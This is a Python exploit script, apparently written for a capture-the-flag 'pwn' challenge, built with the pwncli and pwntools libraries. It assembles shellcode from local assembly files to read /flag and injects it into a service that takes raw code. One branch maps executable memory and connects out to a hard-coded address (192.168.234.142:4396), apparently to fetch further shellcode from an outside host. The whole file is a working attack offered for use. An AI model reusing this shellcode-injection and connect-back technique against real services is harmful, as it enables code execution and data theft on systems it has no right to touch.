#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *

cli_script()

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

io: tube = gift.io

# filename = "./normal_orw.s"
# filename = "./ptrace.s"
# filename = "./uring_orw.s"
# filename = "./uring_orw_new.s"
filename = "./recvfrom.s"

with open(filename, "r") as fd:
    shellcode = asm(fd.read())
    assert len(shellcode) <= 0x400

if not "recvfrom" in filename:
    ru(b"Input your code\n")
    s(shellcode.ljust(0x3F9, b"\x00") + b"/flag\x00")

else:
    ru(b"Input your code\n")
    payload = asm(shellcraft.mmap(0, 0xD0000, 7, 0x21, 0, 0))
    payload += asm("mov r12, rax")
    payload += asm(shellcraft.connect("192.168.234.142", 4396))
    payload += asm("mov r13, rbp")
    payload += shellcode
    s(payload)  # + b"/flag\x00")

ru(b"Wish you a good journey\n")

ia()
